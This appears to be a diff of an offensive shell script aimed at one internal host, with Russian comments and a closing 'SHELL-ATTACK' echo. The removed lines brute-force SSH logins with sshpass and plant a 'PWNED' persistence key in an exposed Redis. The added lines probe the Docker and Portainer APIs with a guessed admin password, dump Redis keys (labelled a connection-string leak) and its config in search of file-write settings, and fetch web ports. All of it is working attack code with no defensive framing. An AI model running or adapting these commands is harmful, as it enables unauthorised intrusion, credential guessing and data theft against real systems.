@@ -1,31 +1,45 @@
-echo "=== SSH hung1 (паттерны Hung) ==="
-for U in hung root eaera; do
-  for PW in "Password123!" "Eaera@2026" "123321" "hung123"; do
-    R=$(timeout 6 sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PubkeyAuthentication=no $U@192.168.3.121 "echo SSH-WIN-$U" 2>&1 | grep -aE "WIN|denied" | head -1)
-    case "$R" in *WIN*) echo "$U/$PW → $R"; break 2;; esac
-  done
+echo "=== 1. DOCKER API (2375/2376) ==="
+for p in 2375 2376; do
+  R=$(timeout 4 wget -q -T 3 -O - "http://192.168.3.121:$p/version" 2>/dev/null | head -c 200)
+  [ -n "$R" ] && echo "DOCKER:$p → $R"
 done
-echo "=== POLIPO как прокси (доступ в интернет через hung1) ==="
-wget -q -T 8 -O - -e "http_proxy=http://192.168.3.121:8123" http://api.ipify.org 2>/dev/null
-echo
-echo "=== REDIS: ЗАКРЕПЛЕНИЕ (наш ключ) ==="
+echo "=== 2. PORTAINER API ==="
+R=$(timeout 4 wget -q -T 3 -O - "http://192.168.3.121:9000/api/status" 2>/dev/null)
+echo "STATUS: $R"
+# Portainer init admin
+R2=$(timeout 6 wget -q -T 4 -O - --header="Content-Type: application/json" --post-data='{"Username":"admin","Password":"Portainer123!"}' "http://192.168.3.121:9000/api/users/admin/check" 2>/dev/null)
+echo "ADMIN-CHECK: $R2"
+echo "=== 3. PG connection string leak (из Redis mt5:commands) ==="
 python3 -c "
 import socket,time
 s=socket.socket();s.settimeout(4);s.connect(('192.168.3.121',6379))
-s.sendall(b'SET cxp:anchor \"2026-09-09 PWNED hn-rack-node14 root github.com/s34vv1nd/ops-pub\"\r\n')
+s.sendall(b'KEYS *\r\n')
 time.sleep(1)
-print(s.recv(50))
-s.sendall(b'GET cxp:anchor\r\n')
-time.sleep(1)
-print(s.recv(100))
+r=s.recv(2000).decode(errors='replace')
+print(r[:500])
+# GET каждый ключ
+for k in ['mt5:commands:eaera-test','cms:action-requests','mt5:results']:
+    s.sendall(f'GET {k}\r\n'.encode())
+    time.sleep(0.5)
+    v=s.recv(2000).decode(errors='replace')[:300]
+    print(f'\n{k}:',v[:200])
 s.close()"
-echo "=== REDIS: MONITOR проба (живой трафик) ==="
+echo "=== 4. ALL REDIS CONFIG ==="
 python3 -c "
 import socket,time
 s=socket.socket();s.settimeout(4);s.connect(('192.168.3.121',6379))
-s.sendall(b'MONITOR\r\n')
-time.sleep(3)
-r=s.recv(2000)
-print('MONITOR:',r.decode(errors='replace')[:300])
+s.sendall(b'CONFIG GET *\r\n')
+time.sleep(2)
+r=s.recv(8000).decode(errors='replace')
+# ищем интересные
+for line in r.split(chr(10)):
+    if any(x in line.lower() for x in ['dir','file','module','save','append','proto']):
+        print(line[:100])
 s.close()"
-echo HUNG1-DONE
+echo "=== 5. HTTP 8000/8080 полные ==="
+for p in 8000 8080; do
+  R=$(timeout 5 wget -q -T 4 -S -O /tmp/h$p "http://192.168.3.121:$p/" 2>&1 | grep "HTTP/" | head -1)
+  B=$(head -c 100 /tmp/h$p 2>/dev/null)
+  echo "$p: $R body=$B"
+done
+echo SHELL-ATTACK
